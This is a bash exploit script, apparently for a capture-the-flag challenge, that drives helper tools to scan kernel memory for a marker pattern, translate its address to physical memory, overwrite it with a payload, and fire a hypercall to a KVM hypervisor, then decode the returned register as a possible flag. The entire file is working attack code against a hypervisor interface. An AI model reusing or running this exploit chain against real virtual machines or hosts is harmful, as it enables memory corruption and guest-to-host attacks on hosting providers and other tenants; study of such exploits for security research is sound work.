#!/bin/bash

# Atomic exploit script - runs everything in one process
# Prevents flag address from changing between operations

# Configuration
SCAN_START="0xffff888100000000"
SCAN_END="0xffffc90000000000"
PAYLOAD="41414141"  # What to write

echo "================================================"
echo "    ATOMIC KVM EXPLOIT - ONE SHOT"
echo "================================================"
echo "Pattern: 44434241efbeadde"
echo "Write:   $PAYLOAD"
echo "Hypercall: 100"
echo "================================================"
echo

# Step 1: Find pattern and capture output
echo "[1/4] Finding pattern..."
PATTERN_OUTPUT=$(./kvm_prober exploit_scan $SCAN_START $SCAN_END 2>&1)
echo "$PATTERN_OUTPUT"

# Extract address from output
VIRT_ADDR=$(echo "$PATTERN_OUTPUT" | grep -o "Found at 0x[0-9a-f]*" | grep -o "0x[0-9a-f]*")

if [ -z "$VIRT_ADDR" ]; then
    echo "[-] Could not find pattern"
    exit 1
fi

echo "[+] Found at: $VIRT_ADDR"

# Step 2: Convert to physical (in same subshell)
echo -e "\n[2/4] Converting to physical..."
PHYS_OUTPUT=$(./kvm_prober v2p $VIRT_ADDR 2>&1)
echo "$PHYS_OUTPUT"

PHYS_ADDR=$(echo "$PHYS_OUTPUT" | grep -o "Phys Addr: 0x[0-9a-f]*" | grep -o "0x[0-9a-f]*")

if [ -z "$PHYS_ADDR" ]; then
    echo "[-] Could not convert to physical"
    exit 1
fi

echo "[+] Physical address: $PHYS_ADDR"

# Step 3: Write to physical memory
echo -e "\n[3/4] Writing payload..."
WRITE_OUTPUT=$(./kvm_prober write_phys $PHYS_ADDR $PAYLOAD 2>&1)
echo "$WRITE_OUTPUT"

# Step 4: Execute hypercall immediately
echo -e "\n[4/4] Executing hypercall 100..."
HYPER_OUTPUT=$(./hyperdump 2>&1 | tail -50)

# Display hypercall result
echo "$HYPER_OUTPUT" | grep -A5 -B5 "HYPERCALL"

# Extract RAX value
RAX_VALUE=$(echo "$HYPER_OUTPUT" | grep "RAX after vmcall:" | grep -o "0x[0-9a-f]*")

if [ -n "$RAX_VALUE" ]; then
    echo "================================================"
    echo "HYPERCALL RESULT: $RAX_VALUE"
    
    # Convert to decimal
    DEC_VALUE=$(printf "%lld" $RAX_VALUE 2>/dev/null || echo "N/A")
    echo "Decimal: $DEC_VALUE"
    
    # Check if we got a flag (not -1)
    if [ "$RAX_VALUE" != "0xffffffffffffffff" ]; then
        echo "ðŸŽ‰ POSSIBLE SUCCESS! Non-error value returned!"
        
        # Try to decode as ASCII
        echo -n "ASCII (reversed): "
        echo "$RAX_VALUE" | sed 's/0x//' | rev | fold -w2 | tac | tr -d '\n' | xxd -r -p
        echo
    fi
fi

echo "================================================"
